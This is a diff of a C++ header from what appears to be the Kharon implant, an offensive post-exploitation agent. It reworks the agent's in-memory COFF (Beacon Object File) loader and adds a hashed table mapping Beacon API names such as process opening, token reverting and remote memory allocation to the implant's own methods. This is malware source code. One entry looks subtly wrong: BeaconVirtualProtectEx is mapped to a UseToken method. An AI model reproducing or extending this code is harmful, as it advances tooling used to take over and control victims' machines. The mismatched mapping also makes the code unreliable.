@@ -682,17 +682,10 @@ namespace Root {
     };
 }
 
-class Coff {
-private:
-    Root::Kharon* Self;    
-public:
-    Coff( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
-
-    auto Loader(
-        _In_ PBYTE Buffer,
-        _In_ ULONG Size
-    ) -> BOOL;
-};
+typedef struct {
+    ULONG SymHash;
+    PVOID SymPtr;
+} COFF_API, *PCOFF_API;
 
 typedef struct {
 	PCHAR original;
@@ -708,13 +701,49 @@ typedef struct {
 	INT   size;     
 } FMTP, *PFMTP;
 
-class Beacon {
+class Coff {
 private:
     Root::Kharon* Self;    
 public:
-    Beacon( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
-    
+
     PPACKAGE Pkg = { 0 };
+
+    struct {
+        UPTR  SymHash;
+        PVOID SymPtr;
+    } ApiTable[30] = {};
+
+    Coff( Root::Kharon* KharonRf ) : Self( KharonRf ) {
+        ApiTable[0]  = { Hsh::Str("BeaconDataParse"),        (PVOID)&Coff::DataParse };
+        ApiTable[1]  = { Hsh::Str("BeaconDataInt"),          (PVOID)&Coff::DataInt };
+        ApiTable[2]  = { Hsh::Str("BeaconDataExtract"),      (PVOID)&Coff::DataExtract };
+        ApiTable[3]  = { Hsh::Str("BeaconDataShort"),        (PVOID)&Coff::DataShort };
+        ApiTable[4]  = { Hsh::Str("BeaconDataLength"),       (PVOID)&Coff::DataLength };
+        ApiTable[5]  = { Hsh::Str("BeaconOutput"),           (PVOID)&Coff::Output };
+        ApiTable[6]  = { Hsh::Str("BeaconPrintf"),           (PVOID)&Coff::Printf };
+        ApiTable[7]  = { Hsh::Str("BeaconInformation"),      (PVOID)&Coff::Information };
+        ApiTable[8]  = { Hsh::Str("BeaconAddValue"),         (PVOID)&Coff::AddValue };
+        ApiTable[9]  = { Hsh::Str("BeaconGetValue"),         (PVOID)&Coff::GetValue };
+        ApiTable[10] = { Hsh::Str("BeaconRemoveValue"),      (PVOID)&Coff::RmValue };
+        ApiTable[11] = { Hsh::Str("BeaconVirtualAlloc"),     (PVOID)&Coff::VirtualAlloc };
+        ApiTable[12] = { Hsh::Str("BeaconVirtualProtect"),   (PVOID)&Coff::VirtualProtect };
+        ApiTable[13] = { Hsh::Str("BeaconVirtualAllocEx"),   (PVOID)&Coff::VirtualAllocEx };
+        ApiTable[14] = { Hsh::Str("BeaconVirtualProtectEx"), (PVOID)&Coff::UseToken };
+        ApiTable[15] = { Hsh::Str("BeaconIsAdmin"),          (PVOID)&Coff::IsAdmin };
+        ApiTable[16] = { Hsh::Str("BeaconRevertToken"),      (PVOID)&Coff::RevertToken };
+        ApiTable[17] = { Hsh::Str("BeaconOpenProcess"),      (PVOID)&Coff::OpenProcess };
+        ApiTable[18] = { Hsh::Str("BeaconOpenThread"),       (PVOID)&Coff::OpenThread };
+        ApiTable[19] = { Hsh::Str("BeaconGetSpawnTo"),       (PVOID)&Coff::GetSpawn };
+    }
+
+    auto RslApi(
+        _In_ PCHAR SymName
+    ) -> PVOID;
+
+    auto Loader(
+        _In_ PBYTE Buffer,
+        _In_ ULONG Size
+    ) -> BOOL;
 
     auto DataExtract(
         PDATAP parser,
